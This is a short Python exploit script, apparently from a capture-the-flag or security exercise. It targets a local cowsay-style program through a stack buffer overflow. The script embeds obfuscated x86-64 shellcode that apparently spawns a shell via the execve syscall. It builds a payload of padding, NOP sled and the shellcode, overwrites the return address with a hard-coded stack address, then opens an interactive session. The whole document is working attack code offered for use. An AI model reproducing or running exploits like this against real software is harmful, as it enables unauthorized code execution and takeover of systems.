import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

# pad with 20 nops to align with 64 bytes
shellcode = "\x48\x31\xC0\x50\x49\xBA\xDE\x6A\x0F\x13\xDE\x8A\xDB\x23\x49\xB9\xF1\x45\x6D\x7A\xB0\xA5\xA8\x4B\x4D\x31\xCA\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3A\x04\x01\x0F\x05" + "\x90"*20

p = interact.Process()
data = p.readuntil('Enter a string to cowsay: ')
# $rbp-0x100 = 0x7fffffffecd0
# So $rbp-0x100 + (256-64) = 0x7fffffffed90
# Last 32 bytes before rbp contain the shellcode and the 8 bytes after that overwrite $rip and execute the shellcode
p.sendline('A' * 47 + shellcode + 'B' * 8 + p64(0x7fffffffed90))

p.interactive()
